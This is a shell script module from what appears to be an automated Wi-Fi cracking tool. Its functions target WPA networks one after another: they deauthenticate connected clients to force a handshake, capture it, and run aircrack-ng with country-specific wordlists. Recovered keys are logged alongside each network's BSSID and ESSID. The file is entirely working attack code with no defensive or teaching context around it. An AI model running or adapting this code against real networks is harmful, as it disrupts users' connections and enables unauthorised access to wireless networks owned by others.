# h_net_wpa
# WPA network helper functions

h_wpa_dict_crack() {
	local dictfile
	dictfile=$1
	h_run aircrack-ng -w $dictfile -a 2 -l $H_CUR_KEY_F $H_CUR_BASE_FNAME-??.$H_CUR_CAP_FEXT
}

h_wpa_wait_for_hs() {
	local time
	local time_start
	local time_elapsed
	local wpa_hs_f

	h_log 1 "waiting WPA handshake for $H_INJECTION_TIME_LIMIT seconds"
	time_start=$(h_now)
	wpa_hs_f=$(echo $H_CUR_CSV_F | sed -e 's,\.csv,\.wpa_hs,')
	while [ 1 ]; do
		sleep $H_REFRESH_DELAY
		time=$(h_now)
		time_elapsed=$(($time - $time_start))
		[ $time_elapsed -ge $H_INJECTION_TIME_LIMIT ] && break
		[ -f $wpa_hs_f ] && return 0
	done
	h_log 1 "no WPA handshake captured"
	return 1
}

h_wpa_key_found() {
	grep -q "^$H_CUR_BSSID," $H_WPA_F 2>/dev/null
}

h_wpa_key_log() {
	local key
	key=$(cat $H_CUR_KEY_F)
	h_log 0 "key found: $key (bssid=$H_CUR_BSSID, channel=$H_CUR_CHANNEL, essid='$H_CUR_ESSID')"
	echo "$H_CUR_BSSID,$H_CUR_ESSID,$H_CUR_CHANNEL,$key" >>$H_WPA_F
}

h_wpa_bruteforce_try() {
	local clients
	local country
	local dicts
	local words
	local RC

	clients=$(h_csv_get_network_sta $H_CUR_CSV_F $H_CUR_BSSID | grep -iv $H_MON_MAC)
	if [ -n "$clients" ]; then
		for client in $clients; do
			h_log 1 "found a client station: $client"
			h_auth_start h_wep_deauth -c $client
		done
		sleep 1
	else
		h_log 1 "no client station found"
	fi

	country=$H_CUR_COUNTRY

	RC=1
	if h_wpa_wait_for_hs; then
		h_log 1 "BF can start \o/ :)"
		dicts=${H_LIB_D}/dict/${country}-wpa-???.dict
		for dict in $dicts; do
			[ -f $dict ] || continue
			words=$(wc -l $dict | awk '{ print $1; }')
			h_log 1 "trying dict '$dict' ($words words)"
			h_wpa_dict_crack $dict
			if [ -f $H_CUR_KEY_F ]; then
				h_hook_call_handlers on_wpa_key_found
				h_wpa_key_log
				RC=0
				break
			fi
		done
		if [ $RC -gt 0 ]; then
			h_log 1 "BF failed"
		fi
	fi

	h_auth_stop

	return $RC
}

h_wpa_bruteforce() {
	h_wpa_key_found && return

	h_log 1 "trying WPA bruteforce mode"

	h_hook_call_handlers on_wpa_bruteforce_started
	
	h_wpa_bruteforce_try

	h_hook_call_handlers on_wpa_bruteforce_ended
}

h_wpa_try_one_network() {
	local capture_options

	h_net_switch $1 || return 1
	h_net_allowed || return 1

	if h_wpa_key_found; then
		h_log 1 "skipping known WPA network (bssid='$H_CUR_BSSID', channel=$H_CUR_CHANNEL, essid='$H_CUR_ESSID')"
		return 0
	fi

	h_log 1 "trying WPA network (bssid='$H_CUR_BSSID', channel=$H_CUR_CHANNEL, essid='$H_CUR_ESSID')"

	h_log 1 "monitoring AP traffic for $H_MONITOR_TIME_LIMIT seconds"
	H_CUR_CAP_FEXT="ivs"
	h_capture_start h_capture --write $H_CUR_BASE_FNAME --bssid $H_CUR_BSSID --channel $H_CUR_CHANNEL --output-format=ivs,csv

	sleep $H_MONITOR_TIME_LIMIT

	H_CUR_CSV_F=$(h_get_last_file $H_CUR_BASE_FNAME-??.csv)
	H_CUR_KEY_F="$H_CUR_BASE_FNAME.key"
	
	[ "$H_OP_MODE_wpa_bruteforce" = "1" ] && h_wpa_bruteforce

	h_capture_stop

	[ -n "$H_SMALL_STORAGE" ] && h_clean_run_d
}

h_wpa_try_all_networks() {
	for N in $(cat $H_NET_WPA_F); do
		h_wpa_try_one_network $N
		h_backup_results
	done
}
